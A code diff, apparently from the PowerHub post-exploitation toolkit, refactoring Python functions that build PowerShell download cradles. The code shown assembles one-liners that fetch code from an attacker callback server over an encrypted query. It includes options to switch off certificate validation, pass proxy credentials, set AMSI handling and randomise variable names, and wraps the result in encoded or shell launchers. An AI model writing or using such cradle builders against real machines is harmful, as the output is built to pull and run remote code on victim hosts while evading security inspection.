@@ -42,53 +42,48 @@ def webdav_url():
     )
 
 
-def build_cradle_https(get_args):
+def build_cradle_https(params):
     result = ''
 
-    if get_args['Transport'] == 'https':
-        if get_args['NoVerification'] == 'true':
+    if params['transport'] == 'https':
+        if params['verification'] == 'noverification':
             result += ("[System.Net.ServicePointManager]::ServerCertificate"
                        "ValidationCallback={$true};")
-        elif get_args['Fingerprint'] == 'true':
+        elif params['verification'] == 'fingerprint':
             from powerhub.reverseproxy import FINGERPRINT
             result += ("[System.Net.ServicePointManager]::ServerCertificate"
                        "ValidationCallback={param($1,$2);"
                        "$2.Thumbprint -eq '%s'};" %
                        FINGERPRINT.replace(':', ''))
-        elif get_args['CertStore'] == 'true':
+        elif params['verification'] == 'certstore':
             pass
-        if get_args['TLS1.2'] == 'true':
+        if params['tlsv1.2'] == 'true':
             result += ("[Net.ServicePointManager]::SecurityProtocol="
                        "[Net.SecurityProtocolType]::Tls12;")
 
     return result
 
 
-def build_cradle_webclient(get_args, key):
+def build_cradle_webclient(params, key):
     result = ''
-    natural = (get_args['Natural'] == 'true')
+    natural = (params['natural'] == 'true')
     web_client = symbol_name('web_client', natural=natural, refresh=True)
 
-    if get_args['Transport'].startswith('http'):
+    if params['transport'].startswith('http'):
         result += "$%(web_client)s=New-Object Net.WebClient;"
 
-        if get_args['Proxy'] == 'true':
+        if params['proxy'] == 'true':
             result += ("$%(web_client)s.Proxy=[Net.WebRequest]::GetSystemWebProxy();"
                        "$%(web_client)s.Proxy.Credentials=[Net.CredentialCache]::"
                        "DefaultCredentials;")
 
-        url = callback_urls()[get_args['Transport']]
+        url = callback_urls()[params['transport']]
 
-        query = "/?t=%(Transport)s&a=%(Amsi)s&k=%(KEX)s" % get_args
-        if not get_args['ClipExec'] == 'none':
-            query += "&c=%(ClipExec)s" % get_args['ClipExec']
+        query = '/?'
+        for label in 'transport amsi kex clip-exec minimal natural'.split():
+            query += params.get_by_label(label).as_query_fragment()
 
-        if get_args['Minimal'] == 'true':
-            query += "&m=t"
-
-        if natural:
-            query += "&n=t"
-
+        # encrypt url
         query = encrypt_aes(query, key)
         # Make b64 encoding urlsafe
         query = query.replace('/', '_').replace('+', '-')
@@ -103,25 +98,25 @@ def build_cradle_webclient(get_args, key):
     return result
 
 
-def build_cradle(get_args, key):
+def build_cradle(params, key):
     """Build the download cradle given a dict of GET arguments"""
-    log.debug("GET arguments: %s" % get_args)
+    log.debug("Building cradle with these paremters: %s" % params)
 
     result = ""
-    natural = (get_args['Natural'] == 'true')
+    natural = (params['natural'] == 'true')
     key_var = symbol_name('global_key', natural=natural)
 
-    result += build_cradle_https(get_args)
+    result += build_cradle_https(params)
 
-    if get_args['KEX'] == 'oob' and key:
+    if params['kex'] == 'oob' and key:
         result += "$%(key_var)s='%(key)s';"
 
-    result += build_cradle_webclient(get_args, key)
+    result += build_cradle_webclient(params, key)
 
     result = result % dict(
-        url=callback_urls()[get_args['Transport']],
-        transport=get_args['Transport'],
-        amsi=get_args['Amsi'],
+        url=callback_urls()[params['transport']],
+        transport=params['transport'],
+        amsi=params['amsi'],
         key_var=key_var,
         key=key,
     )
@@ -131,13 +126,13 @@ def build_cradle(get_args, key):
 
     powershell_exe = 'powershell.exe'
 
-    if get_args['Launcher'] == 'cmd':
+    if params['launcher'] == 'cmd':
         result = '%s "%s"' % (powershell_exe, result)
-    elif get_args['Launcher'] == 'cmd_enc':
+    elif params['launcher'] == 'cmd_enc':
         result = '%s -Enc %s' % (
             powershell_exe,
             binascii.b2a_base64(result.encode('utf-16le')).decode())
-    elif get_args['Launcher'] == 'bash':
+    elif params['launcher'] == 'bash':
         result = result.replace('$', '\\$')
         result = '"%s \\\"%s\\\""' % (powershell_exe, result)
 
